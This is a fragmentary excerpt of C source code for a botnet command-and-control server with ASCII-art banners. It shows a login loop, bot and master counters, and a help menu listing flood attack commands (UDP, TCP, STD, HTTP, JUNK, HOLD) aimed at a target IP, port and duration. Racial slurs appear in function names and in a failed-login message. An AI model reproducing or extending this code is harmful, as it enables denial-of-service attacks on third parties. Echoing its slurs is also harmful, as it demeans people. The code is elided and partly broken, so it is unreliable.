...
| $$  | $$| $$      | $$      | $$  \ $$  | $$    \  $$$/    | $$  | $$\  $$$| $$  \ $$      
| $$  | $$| $$      | $$      | $$  | $$ /$$$$$$   \  $/    /$$$$$$| $$ \  $$|  $$$$$$/      
|__/  |__/|__/      |__/      |__/  |__/|______/    \_/    |______/|__/  \__/ \______/       
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;BOT COUNT: %d| MASTERS: %d%c", '\033', NiggesrConnected(), SlavesConnected, '\007');
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(failed_line1, "\x1b[31mSTUPID FUCKING NIGGER GET IP LOGGED\r\n");
		...
		sprintf(ascii_banner_line1, "\x1b[31m ________  ________  ________  ________  ___  ___      ___ ___  ________   ________ \r\n");        
        sprintf(ascii_banner_line1, "\x1b[31m|\   __  \|\   __  \|\   __  \|\   __  \|\  \|\  \    /  /|\  \|\   ___  \|\   ____\ \r\n");       
        sprintf(ascii_banner_line1, "\x1b[31m\ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \ \  \  /  / | \  \ \  \\ \  \ \  \___|  \r\n");      
        sprintf(ascii_banner_line1, "\x1b[31m \ \   __  \ \   ____\ \   ____\ \   _  _\ \  \ \  \/  / / \ \  \ \  \\ \  \ \  \  ___ \r\n");     
        sprintf(ascii_banner_line1, "\x1b[31m  \ \  \ \  \ \  \___|\ \  \___|\ \  \\  \\ \  \ \    / /   \ \  \ \  \\ \  \ \  \|\  \ \r\n");    
        sprintf(ascii_banner_line1, "\x1b[31m   \ \__\ \__\ \__\    \ \__\    \ \__\\ _\\ \__\ \__/ /     \ \__\ \__\\ \__\ \_______\ \r\n");   
        sprintf(ascii_banner_line1, "\x1b[31m    \|__|\|__|\|__|     \|__|     \|__|\|__|\|__|\|__|/       \|__|\|__| \|__|\|_______|  \r\n");  
		sprintf(welcome_line,       "\r\n\x1b[34m		~[\x1b[31mWelcome, %s\x1b[34m  ]~\r\n", accounts[find_line].username);
		sprintf(banner_bot_count, 	"\x1b[34m		~[\x1b[31mBOT COUNT: %d\x1b[34m	   ]~\r\n", NiggersConnected(), SlavesConnected);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(helpline2,  "\x1b[31m~[\x1b[37mUDP\x1b[31m]~ \x1b[37m!* UDP IP Port Time 32 0 10\r\n");
				sprintf(helpline3,  "\x1b[31m~[\x1b[37mTCP\x1b[31m]~ \x1b[37m!* TCP IP Port Time 32 all 0 10\r\n");
				sprintf(helpline4,	"\x1b[31m~[\x1b[37mSTD\x1b[31m]~ \x1b[37m!* STD IP Port Time\r\n");
				sprintf(helpline5,  "\x1b[31m~[\x1b[37mHTTP\x1b[31m]~ \x1b[37m!* HTTP Url Time\r\n");
				sprintf(helpline6,  "\x1b[31m~[\x1b[37mJUNK\x1b[31m]~ \x1b[37m!* JUNK IP Port Time\r\n");
				sprintf(helpline7,  "\x1b[31m~[\x1b[37mHOLD\x1b[31m]~ \x1b[37m!* HOLD IP Port Time\r\n");
